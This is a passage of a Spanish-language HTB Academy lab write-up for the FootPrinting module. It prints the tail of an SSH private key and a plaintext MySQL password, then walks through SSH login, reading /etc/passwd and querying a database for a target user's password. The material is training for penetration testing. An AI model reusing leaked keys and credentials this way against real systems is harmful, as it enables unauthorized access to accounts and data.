y4HXDjeoV2GJruL7qAAAAQEA/XiMw8fvw6MqfsFdExI6FCDLAMnuFZycMSQjmTWIMP3cNA
2qekJF44lL3ov+etmkGDiaWI5XjUbl1ZmMZB1G8/vk8Y9ysZeIN5DvOIv46c9t55pyIl5+
fWHo7g0DzOw0Z9ccM0lr60hRTm8Gr/Uv4TgpChU1cnZbo2TNld3SgVwUJFxxa//LkX8HGD
vf2Z8wDY4Y0QRCFnHtUUwSPiS9GVKfQFb6wM+IAcQv5c1MAJlufy0nS0pyDbxlPsc9HEe8
EXS1EDnXGjx1EQ5SJhmDmO1rL1Ien1fVnnibuiclAoqCJwcNnw/qRv3ksq0gF5lZsb3aFu
kHJpu34GKUVLy74QAAAQEA+UBQH/jO319NgMG5NKq53bXSc23suIIqDYajrJ7h9Gef7w0o
eogDuMKRjSdDMG9vGlm982/B/DWp/Lqpdt+59UsBceN7mH21+2CKn6NTeuwpL8lRjnGgCS
t4rWzFOWhw1IitEg29d8fPNTBuIVktJU/M/BaXfyNyZo0y5boTOELoU3aDfdGIQ7iEwth5
vOVZ1VyxSnhcsREMJNE2U6ETGJMY25MSQytrI9sH93tqWz1CIUEkBV3XsbcjjPSrPGShV/
H+alMnPR1boleRUIge8MtQwoC4pFLtMHRWw6yru3tkRbPBtNPDAZjkwF1zXqUBkC0x5c7y
XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----

Copiamos el contenido **id_rsa** en un archivo y le damos permiso de usuarios

```
chmod 600 id_rsa
ssh -i id_rsa tom@10.129.202.20
```

<p align="center"> 
<img src="images/ssh.png" width="600" alt="Resultado de Nmap">
</p>

```
cat /etc/passswd
```

<p align="center"> 
<img src="images/mysql.png" width="600" alt="Resultado de Nmap">
</p>

##### MySQL

Investigando dentro del archivo **passwd** me encuentro que hay un usuario mysql, no olvidemos que el objetivo al final es encontrar la contraseña del usuario **HTB**

```
mysql -u tom -p
```

contraseña:<font color="#00b050">NMds732Js2761</font>

<p align="center"> 
<img src="images/mysql-1.png" width="600" alt="Resultado de Nmap">
</p>

Estamos dentro, usaremos los siguientes comandos: 

```
show databases;
```

<p align="center"> 
<img src="images/bbdd 1.png" width="600" alt="Resultado de Nmap">
</p>

```
use users;
```

<p align="center"> 
<img src="images/tabla.png" width="600" alt="Resultado de Nmap">
</p>

```
show tables;
```

<p align="center"> 
<img src="images/users.png" width="600" alt="Resultado de Nmap">
</p>

```
show columns from users;
```

<p align="center"> 
<img src="images/columns.png" width="600" alt="Resultado de Nmap">
</p>

```
SELECT * FROM users WHERE username LIKE "HTB";
```

<p align="center"> 
<img src="images/HTB123.png" width="600" alt="Resultado de Nmap">
</p>

#### Conclusión

El laboratorio **Hard** del módulo _FootPrinting_ de la plataforma HTB Academy es bastante completo. La forma adecuada de abordarlo comienza con una correcta enumeración de los puertos TCP. Sin embargo, si se analiza con mayor detenimiento, se puede identificar que falta un paso clave: la enumeración de puertos UDP.

Al realizar esta enumeración adicional, se descubre un servicio SNMP, que resulta ser fundamental. A través de este protocolo se obtienen credenciales que posteriormente permiten acceder a los servicios IMAP/POP3.

Una vez conseguido el archivo _id_rsa_ dentro del protocolo **IMAP/POP3**, se inicia sesión en el sistema. Durante la fase de post-explotación, se detecta que el servicio MySQL está instalado. Se prueban nuevamente las credenciales obtenidas previamente mediante SNMP, logrando acceso a la base de datos.

Tras explorar la base de datos, finalmente se obtiene la contraseña del usuario **HTB**, completando así el modulo **FootPrinting**